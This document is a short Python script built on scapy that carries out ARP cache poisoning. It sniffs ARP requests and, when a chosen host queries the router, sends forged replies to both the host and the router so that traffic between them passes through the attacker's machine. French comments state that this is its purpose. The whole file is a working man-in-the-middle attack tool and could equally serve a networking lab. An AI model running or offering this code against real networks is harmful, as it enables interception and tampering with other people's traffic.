#! /usr/bin/env python
from scapy.all import *
import time
coruptedREP =  ARP(op=2, psrc="192.168.0.1", hwsrc="Ax:xx:xx:xx:xx:xx")

def sendpacket(isrc,hsrc,ipdst,hdst):
	print("\nPoisoned REPLY :")
	time.sleep(0.1)
	coruptedREP =  ARP(op=2, psrc=isrc, hwsrc=hsrc,pdst=ipdst,hwdst=hdst)
	printlayer(coruptedREP)
	sr(coruptedREP,retry=3,timeout=0.1)


def printlayer(pkt):
	print("Source:")
	print(pkt.getlayer(ARP).psrc)
	print(pkt.getlayer(ARP).hwsrc)
	print("Destination:")
	print(pkt.getlayer(ARP).pdst)
	print(pkt.getlayer(ARP).hwdst)

def pkt_callback(pkt):
	print("\n\nNew:\n")
	if int(pkt.getlayer(ARP).op) == 1:
		print("ARP request")
		printlayer(pkt)

		#on  fait croire a la machine que  nous somme le router
		if((pkt.getlayer(ARP).psrc) == "192.168.0.25" and (pkt.getlayer(ARP).pdst) == "192.168.0.1"):
			sendpacket("192.168.0.1","Ax:xx:xx:xx:xx:xx",pkt.getlayer(ARP).psrc,pkt.getlayer(ARP).hwsrc)

			#on  fait croire au router  que nous somme la machine
			sendpacket("192.168.0.25","Ax:xx:xx:xx:xx:xx","192.168.0.1","00:00:00:00:00:00")


	else:
		print("ARP Reply")
		printlayer(pkt)
		# and (pkt.getlayer(ARP).pdst) == "192.168.0.25"
		# if((pkt.getlayer(ARP).psrc) == "192.168.0.1" and (pkt.getlayer(ARP).pdst) == "192.168.0.25"):
		# 	print("\nPoisoned REPLY :")
		# 	coruptedREP[ARP].hwdst=pkt.getlayer(ARP).hwsrc
		# 	coruptedREP[ARP].pdst=pkt.getlayer(ARP).psrc
		# 	printlayer(coruptedREP)

sniff(prn=pkt_callback, filter="arp", store=0)